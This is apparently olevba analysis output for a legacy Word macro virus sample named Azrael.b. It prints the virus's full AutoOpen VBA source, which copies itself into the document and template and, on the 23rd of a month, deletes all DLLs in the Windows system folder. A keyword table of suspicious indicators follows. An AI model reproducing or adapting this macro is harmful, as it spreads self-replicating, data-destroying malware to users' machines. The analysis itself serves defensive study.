olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Azrael.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Azrael.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUtOoPeN.bas 
in file: ./Virus.MSWord.Azrael.b - OLE stream: 'Macros/VBA/aUtOoPeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
On Error Resume Next
WordBasic.MacroCopy "aUtOoPeN", WordBasic.[FileName$]() + ":" + "aUtOoPeN"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + "aUtOoPeN", "aUtOoPeN"
If (WordBasic.Day(WordBasic.Now()) = 23) Then
    WordBasic.Kill "c:\windows\system\*.dll"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtOoPeN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

